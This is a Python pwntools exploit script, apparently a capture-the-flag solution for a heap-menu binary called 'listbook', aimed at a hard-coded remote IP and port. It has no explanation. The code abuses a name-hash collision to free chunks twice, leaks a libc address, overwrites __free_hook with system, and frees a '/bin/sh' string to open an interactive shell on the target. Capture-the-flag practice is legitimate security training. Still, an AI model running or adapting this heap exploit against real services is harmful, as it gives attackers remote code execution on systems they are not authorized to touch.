from pwn import *
context.log_level = 'debug'
# p = process(['./listbook'])
p = remote("111.186.58.249", 20001)
libc = ELF("./libc-2.31.so")


def menu(idx):
    p.sendlineafter('>>', str(idx))


def add(name, content):
    menu(1)
    p.sendafter('name>', name)
    p.sendafter('content>', content)


def delete(idx):
    menu(2)
    p.sendlineafter('index>', str(idx))


def show(idx):
    menu(3)
    p.sendlineafter('index>', str(idx))
    res = []
    while True:
        key = p.recvuntil(' => ', timeout=1)
        if len(key) == 0:
            break
        val = p.recvline(keepends=False)
        res.append((key, val))
    return res


def myhash(s):
    return abs(sum(s)) % 16


add('\n', '\n')
for i in range(7):
    add('\x02\n', '\n')
delete(2)
delete(0)
for i in range(7):
    add('\x02\n', '\n')

add('\x03\n', '\n')
add('\x00\n', '\n')
delete(0)
add('\x04\n', '\n')
add('\x80\n', '\n')
delete(2)
delete(4)
libc.address = u64(show(0)[0][1].ljust(8, b'\x00')) + 0x00007f3287016000 - 0x7f3287201be0
# print(hex(val))
delete(3)

for i in range(7):
    add('\x02\n', '\n')
add('\x05\n', b'\x00' * 0x88 + p64(0x211) + b'A\n')
add('\x06\n', b'\n')
delete(6)
delete(0)
delete(5)
add('\x05\n', b'\x00' * 0x88 + p64(0x211) + p64(libc.symbols['__free_hook'])[:7] + b'\n')
add('\x00\n', '/bin/sh\x00\n')
add('\x06\n', p64(libc.symbols['system']) + b'\n')
delete(0)

# gdb.attach(p)
p.interactive()
if __name__ == '__main__':
    pass
